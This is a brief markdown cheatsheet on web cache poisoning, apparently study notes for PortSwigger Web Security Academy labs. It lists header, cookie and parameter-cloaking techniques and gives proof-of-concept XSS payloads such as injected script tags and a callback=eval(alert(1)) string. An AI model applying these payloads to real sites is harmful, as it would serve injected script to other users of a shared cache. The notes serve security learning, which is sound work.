---
title: Cache poisoning
description: Web cache poisoning cheatsheet
---

# Web cache poisoning

## Definition

**Web cache poisoning** is a type of cyber attack that targets the cache of a web server or web browser. The goal of this attack is to **inject malicious or unauthorized content into the cache**, so that it is served to users who request the same content in the future. This can be used to spread malware or to trick users into visiting malicious websites, for example.

## Cheatsheet

- Cache Host header to control $URL/resources/...
- Cache cookie to control pages content (language=fr)
- `GET /resources/js/tracking.js` and `X-Forwarded-Host` to redirect to my exploit server
- `Vary` header provides list of cache key header
    - If User-Agent in Vary, try to capture it (ex: load image to your website) or BF UA
- Unkeyed query string : `GET /?'><script>alert(1)</script>` or param `/?utm_content='%3e%3cscript%3ealert(1)%3c%2fscript%3e`
- Parameter cloacking `/js/geolocate.js?callback=setCountryCookie&utm_content=toto;callback=eval(alert(1))%3bconsole.log` will serve `/js/geolocate.js?utm_content=toto&callback=eval(alert(1))%3bconsole.log`. You need a param that will be removed from the cache
- GET request with body

```
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Host: xxx.web-security-academy.net
X-HTTP-Method-Override: POST
[...]

callback=alert(1);console.log
```

- URL normalization : caching `/notfound<script>alert(1)</script>` into `/notfound%3Cscript%3Ealert(1)%3C/script%3E`

## References

- [PortSwigger - Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)